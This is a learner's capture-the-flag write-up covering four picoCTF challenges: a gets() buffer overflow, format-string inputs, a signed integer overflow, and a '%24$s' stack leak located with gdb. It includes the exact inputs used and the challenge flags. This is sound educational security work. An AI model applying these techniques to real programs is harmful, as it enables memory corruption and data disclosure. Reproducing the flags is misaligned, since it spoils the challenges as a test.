# buffer overflow 0
**FLAG** - picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
## Approach
To start off I downloaded the vuln.c file from  picoctf, and went through the program till I noticed this section of the code
![image](https://github.com/user-attachments/assets/f79aeebb-49ba-4147-9e3a-48ee83f5ed6f)

the `gets()` function is infamous for being a massive vulnerability due to its potential for allowing overflows, this coupled with the fact that the `vuln` function used
the strcpy function(also known for causing potential vulnerability entry points)


![image](https://github.com/user-attachments/assets/c65f2724-dbd9-425a-a900-a515f4c0d48c)


knowing these facts, and also that the challenge was named buffer overflow, I assumed that entering a string longer than 100 characters would overflow , so I just entered an
arbitarily long string

```bash
root@DESKTOP-MPJ395R:/mnt/c/Users/Aditya/Downloads# nc saturn.picoctf.net 49747
Input: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Concepts Learnt
- Buffer Overflow

# format string 0
**FLAG** - picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
## Approach
After connecting to the instance, I am met with these options

```bash
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
```

I knew the challenge involved format specifiers in someway or another , so I chose `Gr%114d_Cheese` (no other options look like format specifiers), after entering this I was prompted with another message from the terminal

```bash
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```
From these options I chose `Cla%sic_Che%s%steak` because again format specifiers, ultimately this gives me the key, I think this works because all the `%s`
specifiers allow us to print stuff from the programs memory

## Incorrect Tangents
- Tried messing around with the `format-string-0.c` file
## Concepts Learnt
- Format String Attacks

# Two-Sum
**FLAG**- picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1}
The Problem States to enter two positive integers whose sum is less than zero, and one of the hints alludes to integer overflow, afterwards I check the source code
it uses two signed ints to account for a and b
```c
static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}
```
knowing that I just enter 2147483647 as both a and b, because the max limit of a signed int is 2^31-1 and that is equal to 2147483647, now this prolly is true for 2147483647 + any number that is within the limits of an integer, but it gets the job done and retrives the flag.

## Incorrect Tangents
- The Objective was pretty straightforward, had no errors
## Concepts Learnt
- Integer Overflow

# Flag Leak
**FLAG** - picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
## Approach
We are given a file vuln and we need to utilize that to exploit the location of the flag. first off I disassemble it with gdb to get the following output
```assembly
Dump of assembler code for function vuln:
   0x08049333 <+0>:     endbr32
   0x08049337 <+4>:     push   %ebp
   0x08049338 <+5>:     mov    %esp,%ebp
   0x0804933a <+7>:     push   %ebx
   0x0804933b <+8>:     sub    $0xc4,%esp
   0x08049341 <+14>:    call   0x80491f0 <__x86.get_pc_thunk.bx>
   0x08049346 <+19>:    add    $0x2cba,%ebx
   0x0804934c <+25>:    sub    $0x8,%esp
   0x0804934f <+28>:    push   $0x40
   0x08049351 <+30>:    lea    -0x48(%ebp),%eax
   0x08049354 <+33>:    push   %eax
   0x08049355 <+34>:    call   0x80492b6 <readflag>
   0x0804935a <+39>:    add    $0x10,%esp
   0x0804935d <+42>:    sub    $0xc,%esp
   0x08049360 <+45>:    lea    -0x1f9c(%ebx),%eax
   0x08049366 <+51>:    push   %eax
   0x08049367 <+52>:    call   0x80490f0 <printf@plt>
   0x0804936c <+57>:    add    $0x10,%esp
   0x0804936f <+60>:    sub    $0x8,%esp
   0x08049372 <+63>:    lea    -0xc8(%ebp),%eax
   0x08049378 <+69>:    push   %eax
   0x08049379 <+70>:    lea    -0x1f6d(%ebx),%eax
   0x0804937f <+76>:    push   %eax
   0x08049380 <+77>:    call   0x8049180 <__isoc99_scanf@plt>
   0x08049385 <+82>:    add    $0x10,%esp
   0x08049388 <+85>:    sub    $0xc,%esp
   0x0804938b <+88>:    lea    -0x1f67(%ebx),%eax
   0x08049391 <+94>:    push   %eax
   0x08049392 <+95>:    call   0x8049120 <puts@plt>
   0x08049397 <+100>:   add    $0x10,%esp
   0x0804939a <+103>:   sub    $0xc,%esp
   0x0804939d <+106>:   lea    -0xc8(%ebp),%eax
   0x080493a3 <+112>:   push   %eax
   0x080493a4 <+113>:   call   0x80490f0 <printf@plt>
   0x080493a9 <+118>:   add    $0x10,%esp
   0x080493ac <+121>:   sub    $0xc,%esp
   0x080493af <+124>:   push   $0xa
   0x080493b1 <+126>:   call   0x8049170 <putchar@plt>
   0x080493b6 <+131>:   add    $0x10,%esp
   0x080493b9 <+134>:   nop
   0x080493ba <+135>:   mov    -0x4(%ebp),%ebx
   0x080493bd <+138>:   leave
   0x080493be <+139>:   ret
```
after setting a breakpoint at 39, I run it to find out that its stored on the 24th location on the stack and after looking up format strings, I use `%24$s` to get the flag, or well the important part of it
## incorrect tangents
- kept disassembling main instead of the whole thing
- compiled vuln.c to vuln instead of just using the program provided
## Important concepts
- learnt a lot about format strings
- learnt more about using gdb as a tool

